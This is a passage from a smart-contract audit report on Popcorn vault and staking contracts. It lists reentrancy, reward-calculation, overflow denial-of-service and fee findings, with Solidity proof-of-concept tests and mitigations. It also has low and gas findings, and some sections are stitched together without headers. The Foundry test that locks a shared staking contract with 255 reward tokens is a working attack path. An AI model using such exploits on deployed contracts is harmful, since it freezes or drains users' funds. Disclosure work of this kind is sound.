2. If reward amounts are too small, the escrow amount will be 0 and that will revert the `claimRewards` so users will not be able to claim rewards. Maybe check if there are escrowed amounts greater than 0 and only call `Escrow.lock` if it is. That way, users with small rewards will always be able to claim funds. Note that only users with larger rewards at time of claiming will have funds escrowed for smaller escrow percentages.

### Impact

Vaults using hookable tokens present a reentrancy upon changing adapter. Each vault has the `takeFees()` modifier that processes performance and management fees. That modifier is invoked only in two opportunities: 

`takeManagementAndPerformanceFees()` (external non access controlled) and when changing an adapter with `changeAdapter()` (external, non access controlled and depends on having a previously proposed adapter).

The `takeFees()` modifier consumes from the `totalAssets()` balance to calculate the amount of management fees via `accruedManagementFee()`:

```solidity
    function accruedManagementFee() public view returns (uint256) {
        uint256 managementFee = fees.management;
        return
            managementFee > 0
                ? managementFee.mulDiv(
                    totalAssets() * (block.timestamp - feesUpdatedAt),
                    SECONDS_PER_YEAR,
                    Math.Rounding.Down
                ) / 1e18
                : 0;
    }
```

However, a vault using hookable tokens can perform a reentrancy if the following conditions are met:

*   There is a proposed new adapter
*   The time to change that adapter has passed (meaning that the `changeAdapter()` call will go through)

```solidity
    function changeAdapter() external takeFees {
        if (block.timestamp < proposedAdapterTime + quitPeriod)
            revert NotPassedQuitPeriod(quitPeriod);

        adapter.redeem(
            adapter.balanceOf(address(this)),
            address(this),
            address(this)
        );

        asset.approve(address(adapter), 0);

        emit ChangedAdapter(adapter, proposedAdapter);

        adapter = proposedAdapter;

        asset.approve(address(adapter), type(uint256).max);

        adapter.deposit(asset.balanceOf(address(this)), address(this));
    }
```

This reentrancy will be triggered by a hook called before the `safeTransferFrom()` upon `deposit()` and the instructions performed inside that hook will occur after `_mint()` and before the assets are effectively transferred to the vault:

```solidity
    function deposit(uint256 assets, address receiver)
        public
        nonReentrant
        whenNotPaused
        syncFeeCheckpoint
        returns (uint256 shares)
    {
        if (receiver == address(0)) revert InvalidReceiver();

        uint256 feeShares = convertToShares(
            assets.mulDiv(uint256(fees.deposit), 1e18, Math.Rounding.Down)
        );

        shares = convertToShares(assets) - feeShares;

        if (feeShares > 0) _mint(feeRecipient, feeShares);

        _mint(receiver, shares);

        asset.safeTransferFrom(msg.sender, address(this), assets);

        adapter.deposit(assets, address(this));

        emit Deposit(msg.sender, receiver, assets, shares);
    }
```

The hookable token can call `changeAdapter()` in a before transfer hook and the contract will use outdated balance values. This is because the vault increases the amount of shares before capturing the assets.

### Proof of Concept

A vault with a hookable token is deployed by Alice. The used token allows users to create custom hooks that run before and/or after each call. A change of adapter is enqueued.

*   Alice proposes a new adapter via `proposeAdapter()`
*   Bob creates a hook that is executed before transferring the assets to the vault that calls `changeAdapter()`
*   Bob triggers a `vault.deposit()` when the quit period passed (so the `changeAdapter()` call does not revert)
*   The hook reenters the `takeFees()` modifier via the `changeAdapter()` call and proceeds to mint management fees to the `feeRecipient`.
*   Because the amount of assets is outdated, the fees minted to the recipient are considerably less.

**Output:**

With the deposit and current amount of shares used for the PoC, it can be seen how the reentrant call yields in a total of `7.119e16` minted shares whereas a normal non-reentrant flow mints `1.06e17`. This means that `33%` of the fees are not transferred to the recipient.

The output was built by adding console logs inside each relevant Vault's function. To reproduce both non reentrant and reentrant scenarios comment the token hook and the respective parts of the PoC.

### Impact

The `changeRewardSpeed()` doesn't calculate the new `endTimestamp` correctly. That causes the reward distribution to be broken.

### Proof of Concept

Given that we have an existing reward with the following configuration:

*   startTimestamp = 0
*   endTimestamp = 100
*   rewardPerSecond = 2
*   initialBalance = 200

The reward speed is changed at `timestamp = 50`, meaning 100 tokens were already distributed. The new endTimestamp is calculated by calling `_calcRewardsEnd()`:

```sol
    // @audit using balanceOf() here has its own issues but let's ignore those for this submission
    uint256 remainder = rewardToken.balanceOf(address(this));

    uint32 prevEndTime = rewards.rewardsEndTimestamp;

    uint32 rewardsEndTimestamp = _calcRewardsEnd(
      prevEndTime > block.timestamp ? prevEndTime : block.timestamp.safeCastTo32(),
      rewardsPerSecond,
      remainder
    );
```

And the calculation is:

```sol
  function _calcRewardsEnd(
    uint32 rewardsEndTimestamp,
    uint160 rewardsPerSecond,
    uint256 amount
  ) internal returns (uint32) {
    if (rewardsEndTimestamp > block.timestamp)
      amount += uint256(rewardsPerSecond) * (rewardsEndTimestamp - block.timestamp);

    return (block.timestamp + (amount / uint256(rewardsPerSecond))).safeCastTo32();
  }

```

*   `rewardsEndTimestamp = 100` (initial endTimestamp)
*   `block.timestamp = 50` (as described earlier)
*   `amount = 100`
*   `rewardsPerSecond = 4` (we update it by calling this function)

Because `rewardEndTimestamp > block.timestamp`, the if clause is executed and `amount` is increased:

$amountNew = 100 + 4 \ast (100 - 50) = 300$

Then it calculates the new `endTimestamp`:

$50 + (300 / 4) = 125$

Thus, by increasing the `rewardsPerSecond` from `2` to `4`, we've **increased** the `endTimestamp` from `100` to `125` instead of decreasing it. The total amount of rewards that are distributed are calculated using the `rewardsPerSecond` and `endTimestamp`. Meaning, the contract will also try to distribute tokens it doesn't hold. It only has the remaining `100` tokens.

By increasing the `rewardsPerSecond` the whole distribution is broken.

### Recommended Mitigation Steps

It's not easy to fix this issue with the current implementation of the contract. There are a number of other issues. But, in essence:

*   determine the remaining amount of tokens that need to be distributed
*   calculate the new endTimestamp: `endTimestamp = remainingAmount / newRewardsPerSecond`

## [[M-30] Vault creator can't change quitPeriod](https://github.com/code-423n4/2023-01-popcorn-findings/issues/187)
*Submitted by [Ruhum](https://github.com/code-423n4/2023-01-popcorn-findings/issues/187)*

The vault's `quitPeriod` can be updated through the `setQuitPeriod()` function. Only the owner of the contract (AdminProxy through VaultController) can call it. But, the VaultController contract doesn't implement a function to call `setQuitPeriod()`. Thus, the function is actually not usable.

This limits the configuration of the vault. Every vault will have to use the standard 3-day `quitPeriod`.

### Proof of Concept

`setQuitPeriod()` has the `onlyOwner` modifier which only allows the AdminProxy to access the function. The AdminProxy is called through the VaultController.

```sol
    function setQuitPeriod(uint256 _quitPeriod) external onlyOwner {
        if (_quitPeriod < 1 days || _quitPeriod > 7 days)
            revert InvalidQuitPeriod();

        quitPeriod = _quitPeriod;

        emit QuitPeriodSet(quitPeriod);
    }
```

The VaultController doesn't provide a function to execute `setQuitPeriod()`. Just search for `setQuitPeriod.selector` and you won't find anything.


### Recommended Mitigation Steps

Add a function to interact with `setQuitPeriod()`.

## [[M-31] Vault creator can't change feeRecipient after deployment](https://github.com/code-423n4/2023-01-popcorn-findings/issues/186)
*Submitted by [Ruhum](https://github.com/code-423n4/2023-01-popcorn-findings/issues/186), also found by [0xMirce](https://github.com/code-423n4/2023-01-popcorn-findings/issues/844) and [0xRobocop](https://github.com/code-423n4/2023-01-popcorn-findings/issues/265)*

The vault's `feeRecipient` can be updated through the `setFeeRecipient()` function. Only the owner of the contract (VaultController) can call it. But, the VaultController contract doesn't implement a function to call `setFeeRecipient()`. Thus, the function is actually not usable.

Since the vault creator won't be able to change the fee recipient they might potentially lose access to those funds.

### Proof of Concept

`setFeeRecipient` has the `onlyOwner` modifier which only allows the AdminProxy to access the function. The AdminProxy is called through the VaultController.

```sol
    function setFeeRecipient(address _feeRecipient) external onlyOwner {
        if (_feeRecipient == address(0)) revert InvalidFeeRecipient();

        emit FeeRecipientUpdated(feeRecipient, _feeRecipient);

        feeRecipient = _feeRecipient;
    }
```

The VaultController doesn't provide a function to execute `setFeeRecipient()`. Just search for `setFeeRecipient.selector` and you won't find anything.

### Recommended Mitigation Steps

Add a function to interact with `setFeeRecipient()`.

## [[M-32] DOS any Staking contract with Arithmetic Overflow](https://github.com/code-423n4/2023-01-popcorn-findings/issues/165)

### Impact

This allows attackers to disable any Staking contract deployed via the system, essentially locking up all funds within the Staking contract. It would lead to a significant loss of funds for all users and the protocol who have staked their Vault tokens. All Staking contracts can be disabled by an attacker. The attack is possible once vault deployments become permissionless which is the primary goal of the Popcorn protocol.

### Proof of Concept

The attack is possible because of the following behaviors:

1.  Any Vault creator can use any Staking contract that was previously deployed by the system - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110>
2.  Any Vault creator can add rewards tokens to the Staking contract attached to their Vault. Note that this Staking contract could be the same contract used by other vaults - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448>
3.  There are no checks to limit the number of rewardTokens added to a Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263>
4.  All critical functions in the Staking contract such as withdraw, deposit, transfer and claimRewards automatically call `accrueRewards` modifier.
5.  `accrueRewards` iterates through all rewardTokens using a uint8 index variable - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373>

First, `verifyCreatorOrOwner` needs to be fixed so that it allows either creator or owner to run functions it protects like it's meant to with the below code:

```solidity
if (msg.sender != metadata.creator && msg.sender != owner) revert NotSubmitterNorOwner(msg.sender);
```

Once this fix is implemented and the protocol enables permissionless vault deployment, the following attack path opens up:

1.  Some legit vaults have already been deployed by owner of the protocol or others and they have a Staking contract with significant funds
2.  Attacker deploys vault using the same Staking contract deployed by any other vault owner/creator. This Staking contract is the target contract to be disabled.
3.  Attacker adds 255 reward tokens to the Staking contract to trigger DOS in any future transactions in the Staking contract
4.  Calling any transaction function in the Staking will always revert due to arithmetic overflow in the `accrueRewards` modifier that loops over all the `rewardTokens` state variable. The overflow is caused since the `i` variable used in the for loop inside accrueRewards uses uint8 and it keeps looping as long as `i < rewardTokens.length`. That means if `rewardTokens` has a length of 256, it will cause `i` uint8 variable to overflow.

The steps for described attack can be simulated with the below test that will need to be added to the `VaultController.t.sol` test file:

```solidity
  function test__disable_any_staking_contract() public {
    addTemplate("Adapter", templateId, adapterImpl, true, true);
    addTemplate("Strategy", "MockStrategy", strategyImpl, false, true);
    addTemplate("Vault", "V1", vaultImpl, true, true);

    // 1. deploy regular legit vault owned by this
    address vault = deployVault();
    address staking = vaultRegistry.getVault(vault).staking;

    vm.startPrank(alice);
    // 2. deploy attacker-owned vault using the same Staking contract as legit vault
    // alice is the attacker
    address attackerVault = controller.deployVault(
      VaultInitParams({
        asset: iAsset,
        adapter: IERC4626(address(0)),
        fees: VaultFees({
          deposit: 100,
          withdrawal: 200,
          management: 300,
          performance: 400
        }),
        feeRecipient: feeRecipient,
        owner: address(this)
      }),
      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),
      DeploymentArgs({ id: 0, data: "" }),
      staking,
      "",
      VaultMetadata({
        vault: address(0),
        staking: staking,
        creator: alice,
        metadataCID: metadataCid,
        swapTokenAddresses: swapTokenAddresses,
        swapAddress: address(0x5555),
        exchange: uint256(1)
      }),
      0
    );

    // 3. Attacker (Alice) adds 255 reward tokens to the Staking contract
    bytes[] memory rewardsData = new bytes[](255);
    address[] memory targets = new address[](255);
    for (uint256 i = 0; i < 255; i++) {
      address _rewardToken = address(
        new MockERC20("Reward Token", string(abi.encodePacked(i)), 18)
      );

      targets[i] = attackerVault;
      rewardsData[i] = abi.encode(
        _rewardToken,
        0.1 ether,
        0,
        true,
        10000000,
        2 days,
        1 days
      );
    }
    controller.addStakingRewardsTokens(targets, rewardsData);

    asset.mint(alice, 100 ether);
    asset.approve(vault, 100 ether);
    IVault(vault).deposit(100 ether, alice);
    IVault(vault).approve(staking, 100 ether);

    // 4. This Staking.deposit call or any other transaction will revert due to arithmetic overflow
    // essentially locking all funds in the Staking contract.
    IMultiRewardStaking(staking).deposit(90 ether, alice);
    vm.stopPrank();
  }
```

Please be reminded to fix `verifyCreatorOwner` first before running the above test. Running the test above will cause the call to `Staking.deposit` to revert with an `Arithmetic over/underflow` error which shows that the Staking contract has successfully been DOS'd. The following is the command for running the test:

    forge test --no-match-contract 'Abstract' --match-test test__disable_any_staking_contract

### Recommended Mitigation Steps

1.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110> - users shouldn't be allowed to deploy using just any Staking contract for their vaults. Because of this, any Vault creator can manipulate a Staking contract which leads to the DOS attack path.
2.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263> - add a check to limit the number of rewardTokens that can be added to the Staking contract so that it does not grow unbounded.
3.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L371-L382> - calculation in rewards accrual should be changed so that it does not have to iterate through all rewards tokens. There should be one global index used to keep track of rewards accrual and only that one storage variable will be updated so that gas cost does not increase linearly as more rewardTokens are added.

## [[M-33] Users lose their entire investment when making a deposit and resulting shares are zero](https://github.com/code-423n4/2023-01-popcorn-findings/issues/155)
*Submitted by [DadeKuma](https://github.com/code-423n4/2023-01-popcorn-findings/issues/155), also found by [chaduke](https://github.com/code-423n4/2023-01-popcorn-findings/issues/141)*

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L147-L165>

### Impact

Users could receive `0` shares and thus lose their entire investment when making a deposit.

### Proof of Concept

Alice calls `deposit` with `999` assets, with herself as the receiver

```solidity
function deposit(uint256 assets, address receiver)
    public
    virtual
    override
    returns (uint256)
{
    if (assets > maxDeposit(receiver)) revert MaxError(assets);

    uint256 shares = _previewDeposit(assets);
    _deposit(_msgSender(), receiver, assets, shares);

    return shares;
}
```

Shares are calculated through `_previewDeposit`, which uses `_convertToShares` rounding down

```solidity
function _convertToShares(uint256 assets, Math.Rounding rounding)
    internal
    view
    virtual
    override
    returns (uint256 shares)
{
    uint256 _totalSupply = totalSupply();
    uint256 _totalAssets = totalAssets();
    return
        (assets == 0 || _totalSupply == 0 || _totalAssets == 0)
            ? assets
            : assets.mulDiv(_totalSupply, _totalAssets, rounding);
}
```

With specific conditions, the share calculation will round to zero.
Let's suppose that `_totalSupply = 100_000` and  `_totalAssets = 100_000_000`, then:

```solidity
assets * _totalSupply / _totalAssets => 999 * 100_000 / 100_000_000
```

which rounds to zero, so total shares are `0`.

Finally, the deposit is completed, and the adapter mints `0 shares`.

```solidity
function _deposit(
    address caller,
    address receiver,
    uint256 assets,
    uint256 shares
) internal nonReentrant virtual override {
    IERC20(asset()).safeTransferFrom(caller, address(this), assets);
    
    uint256 underlyingBalance_ = _underlyingBalance();
    _protocolDeposit(assets, shares);
    // Update the underlying balance to prevent inflation attacks
    underlyingBalance += _underlyingBalance() - underlyingBalance_;

    _mint(receiver, shares);

    harvest();

    emit Deposit(caller, receiver, assets, shares);
}
```

Alice has lost `999` assets and she has received nothing in return.

### Recommended Mitigation Steps

Revert the transaction when a deposit would result in `0` shares minted.

Anyone can reset fees to 0 value when Vault is deployed. As result protocol will stop collecting fees.

### Proof of Concept

Anyone can call `changeFees` function in order to change `fees` variable to `proposedFees`.

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L540-L546>

```solidity
    function changeFees() external {
        if (block.timestamp < proposedFeeTime + quitPeriod)
            revert NotPassedQuitPeriod(quitPeriod);


        emit ChangedFees(fees, proposedFees);
        fees = proposedFees;
    }
```

There is a check that should not allow anyone to call function before `quitPeriod` has passed after fees changing was proposed.

However function doesn't check that `proposedFeeTime` is not 0, so that means that after Vault has deployed, anyone can call this function and the check will pass.

That means that `fees` will be set to the `proposedFees`, which is 0.

As result protocol will stop collecting fees.

Use this test inside Vault.t.sol. Here you can see that no one proposed fee changing, but it was changed and set fees to 0.

```solidity
function test__changeFees() public {
    VaultFees memory newVaultFees = VaultFees({ deposit: 0, withdrawal: 0, management: 0, performance: 0 });
    //noone proposed
    //vault.proposeFees(newVaultFees);

    vm.warp(block.timestamp + 3 days);

    vm.expectEmit(false, false, false, true, address(vault));
    emit ChangedFees(VaultFees({ deposit: 0, withdrawal: 0, management: 0, performance: 0 }), newVaultFees);

    vault.changeFees();

    (uint256 deposit, uint256 withdrawal, uint256 management, uint256 performance) = vault.fees();
    assertEq(deposit, 0);
    assertEq(withdrawal, 0);
    assertEq(management, 0);
    assertEq(performance, 0);
  }
```

        emit ChangedFees(fees, proposedFees);
        fees = proposedFees;

## [[M-35] Vault.maxWithdraw returns asset amount that is too big for Vault.withdraw](https://github.com/code-423n4/2023-01-popcorn-findings/issues/67)
*Submitted by [koxuan](https://github.com/code-423n4/2023-01-popcorn-findings/issues/67)*

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L398-L416>

### Impact

ERC4626 standard requires `maxWithdraw` to return the maximum amount of underlying assets that can be withdrawn from the owner balance with a single withdraw call. `withdraw` in `Vault` implements a fee which is not calculated in `maxWithdraw` in `Vault`. Therefore, upstream contracts that call `maxWithdraw` and use the return value for withdraw will always revert.

### Proof of Concept

Upstream contract calls maxWithdraw to determine maximum amount of assets user can withdraw. `adapter` is the wrapper that allows interaction with the underlying ERC4626 protocol.

```solidity
    function maxWithdraw(address caller) external view returns (uint256) {
        return adapter.maxWithdraw(caller);
    }
```

The upstream contract uses the return amount of assets as the input for `withdraw`. Notice that there is a withdrawal fee added by increasing the shares required. Since `maxWithdraw` would have returned the maximum assets that can be returned, increasing the shares required from withdrawal fee will mean that the shares required will exceed shares that user have. This will cause a revert during the transfer of shares from user to vault.

```solidity
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) public nonReentrant syncFeeCheckpoint returns (uint256 shares) {
        if (receiver == address(0)) revert InvalidReceiver();


        shares = convertToShares(assets);


        uint256 withdrawalFee = uint256(fees.withdrawal);


        uint256 feeShares = shares.mulDiv(
            withdrawalFee,
            1e18 - withdrawalFee,
            Math.Rounding.Down
        );


        shares += feeShares;


        if (msg.sender != owner)
            _approve(owner, msg.sender, allowance(owner, msg.sender) - shares);


        _burn(owner, shares);


        if (feeShares > 0) _mint(feeRecipient, feeShares);


        adapter.withdraw(assets, receiver, address(this));


        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }


    function redeem(uint256 shares) external returns (uint256) {
        return redeem(shares, msg.sender, msg.sender);
    }
```

Note, this applies to all max&ast; functions too in `Vault`. They all delegate to adapter which does not include withdrawal or deposit fee.

```solidity
    /// @return Maximum amount of underlying `asset` token that may be deposited for a given address. Delegates to adapter.
    function maxDeposit(address caller) public view returns (uint256) {
        return adapter.maxDeposit(caller);
    }

    /// @return Maximum amount of vault shares that may be minted to given address. Delegates to adapter.
    function maxMint(address caller) external view returns (uint256) {
        return adapter.maxMint(caller);
    }

    /// @return Maximum amount of underlying `asset` token that can be withdrawn by `caller` address. Delegates to adapter.
    function maxWithdraw(address caller) external view returns (uint256) {
        return adapter.maxWithdraw(caller);
    }

    /// @return Maximum amount of shares that may be redeemed by `caller` address. Delegates to adapter.
    function maxRedeem(address caller) external view returns (uint256) {
        return adapter.maxRedeem(caller);
    }

```

### Recommended Mitigation Steps

Recommend calculating the withdrawal fee and deducting it in `maxWithdraw`. Same for the withdrawal and deposit fees for all the max&ast; functions.

## [L&#x2011;01]  Unchecked return value of low level `call()`/`delegatecall()`

*There are 2 instances of this issue:*

```solidity
File: src/vault/adapter/abstracts/AdapterBase.sol

444               address(strategy).delegatecall(
445                   abi.encodeWithSignature("harvest()")
446:              );

```

```solidity
File: src/vault/AdminProxy.sol

```
https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/AdminProxy.sol#L24

## [L&#x2011;02]  Upgradeable contract not initialized

Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user

*There are 2 instances of this issue:*

```solidity
File: src/vault/Vault.sol

/// @audit missing __ReentrancyGuard_init()
/// @audit missing __Pausable_init()
26:   contract Vault is

```
https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L26

## [L&#x2011;03]  Loss of precision

Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator

*There are 2 instances of this issue:*

```solidity
File: src/utils/MultiRewardStaking.sol

359:      return (block.timestamp + (amount / uint256(rewardsPerSecond))).safeCastTo32();

```
https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L359

```solidity
File: src/vault/Vault.sol

433                   ? managementFee.mulDiv(
434                       totalAssets() * (block.timestamp - feesUpdatedAt),
435                       SECONDS_PER_YEAR,
436                       Math.Rounding.Down

## [L&#x2011;04]  Signatures vulnerable to malleability attacks

`ecrecover()` accepts as valid, two versions of signatures, meaning an attacker can use the same signature twice. Consider adding checks for signature malleability, or using OpenZeppelin's `ECDSA` library to perform the extra checks necessary in order to prevent this attack.

## [L&#x2011;05]  Owner can renounce while system is paused

The contract owner or single user with a role is not prevented from renouncing the role/ownership while the contract is paused, which would cause any user assets stored in the protocol, to be locked indefinitely

## [L&#x2011;07]  Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions
See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.

## [L&#x2011;08]  Missing `initializer` modifier on constructor

OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.

## [N&#x2011;04]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)

While the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist

## [N&#x2011;05]  Lines are too long

Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length

## [N&#x2011;06]  Variable names that consist of all capital letters should be reserved for `constant`/`immutable` variables

## [N&#x2011;12]  Consider using `delete` rather than assigning zero to clear values

The `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic

## [N&#x2011;13]  Contracts should have full test coverage

While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit.

## [N&#x2011;14]  Large or complicated code bases should implement fuzzing tests

Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement [fuzzing tests](https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05). Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly.

### [L&#x2011;09]  Unsafe use of `transfer()`/`transferFrom()` with `IERC20`
Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `transfer()` and `transferFrom()` functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their [function signatures](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) do not match and therefore the calls made, revert (see [this](https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5) link for a test case). Use OpenZeppelinÃ¢â‚¬â„¢s `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead

*There is 1 instance of this issue:*

```solidity
File: src/vault/VaultController.sol

/// @audit (valid but excluded finding)
457:        IERC20(rewardsToken).transferFrom(msg.sender, address(adminProxy), amount);

```

### [L&#x2011;10]  Return values of `transfer()`/`transferFrom()` not checked
Not all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment

```solidity
File: src/vault/VaultController.sol

/// @audit (valid but excluded finding)

### [L&#x2011;11]  `safeApprove()` is deprecated
[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts.

## Excluded Non-Critical Findings

These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness

### [N&#x2011;18]  Return values of `approve()` not checked
Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything

### [N&#x2011;20]  Event is missing `indexed` fields
Index event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

## [G-01] Using immutable on variables that are only set in the constructor and never after (Save 16.8K gas)

Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD.

Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas).

`Gas Per variable: 2.1k`

`Total Instances: 8 `

**`Gas Saved: 8 * 2.1k=16.8k`**

## [G-02] Cheaper to calculate domain separator every time (12.6k gas)

Since `INITIAL_CHAIN_ID` and `INITIAL_DOMAIN_SEPARATOR` are no longer immutable, but are state variables, you end up looking up their value every time, which incurs a very large gas penalty. It's cheaper to just calculate it every time.

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L709-L714

```

## [G-03] Tightly pack storage variables/optimize the order of variable declaration (Save 6.3K gas)

**Note the following lines and the explanation to understand the why and how the packing would be achieved**

**This packing is only achievable as we can reduce the size of time variable from uint256 to uint64 which should be safe as they are just timestamps**

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L468

```solidity
File: /src/vault/Vault.sol
468:    uint256 public feesUpdatedAt;

508:    uint256 public proposedFeeTime;

567:    uint256 public proposedAdapterTime;
```
 As `feesUpdatedAt,proposedFeeTime,proposedAdapterTime` are  simply  variables representing timestamps, we could get away with making them to be of type  `uint64` which should be safe for around `532 years`
 
### Pack `feesUpdatedAt` with `asset` to save 1 SLOT (2.1k gas)

For `feesUpdatedAt`  we could pack it with `    IERC20 public asset;` on [Line 37](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L37)

## [G-04] The result of a function call should be cached rather than re-calling the function

External calls are expensive. Consider caching the following:

## [G-07] Multiple accesses of a mapping/array should use a local variable cache

Caching a mapping's value in a local storage or calldata variable when the value is accessed multiple times saves ~42 gas per access due to not having to perform the same offset calculation every time.

**Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it**

To help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array. 

As an example, instead of repeatedly calling ```someMap[someIndex]```, save its reference like this: ```SomeStruct storage someStruct = someMap[someIndex]``` and use it.

## [G-09]  Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate

Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.

## [G-10]  Using storage instead of memory for structs/arrays saves gas

When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read. Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct.

Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L243-L288

### Cheaper to reorder the if's check to have the cheap check for functional parameter before other operations

```solidity
File: /src/utils/MultiRewardStaking.sol
243:  function addRewardToken(
244:    IERC20 rewardToken,
245:    uint160 rewardsPerSecond,
246:    uint256 amount,
247:    bool useEscrow,
248:    uint192 escrowPercentage,
249:    uint32 escrowDuration,
250:    uint32 offset
251:  ) external onlyOwner {
252:    if (asset() == address(rewardToken)) revert RewardTokenCantBeStakingToken();

254:    RewardInfo memory rewards = rewardInfos[rewardToken];
255:    if (rewards.lastUpdatedTimestamp > 0) revert RewardTokenAlreadyExist(rewardToken);

